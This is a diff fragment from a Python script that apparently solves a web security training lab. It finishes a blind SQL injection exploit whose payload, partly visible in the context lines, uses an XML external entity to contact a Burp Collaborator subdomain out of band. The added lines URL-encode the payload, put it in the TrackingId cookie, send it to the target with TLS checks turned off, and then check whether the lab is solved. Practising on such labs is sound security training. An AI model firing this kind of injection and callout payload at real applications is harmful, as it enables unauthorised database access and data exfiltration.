@@ -37,9 +37,18 @@ def main(args):
           "http://BURP-COLLABORATOR-SUBDOMAIN/">
           %remote;]>'),'/l') FROM dual--
 )    
-        
-        
-        
+    exploit_encoded = urllib.parse.quote(exploit)
+    cookies = {
+        "TrackingId": exploit_encoded,
+        "session": session_token,
+    }    
+    log.info("Sending exploit")
+    if args.no_proxy:
+        resp = requests.get(shop.base_url, cookies=cookies)
+    else:
+        resp = requests.get(shop.base_url, cookies=cookies, proxies=utils.PROXIES, verify=False
+        )
+    shop.is_solved()
         
         
         
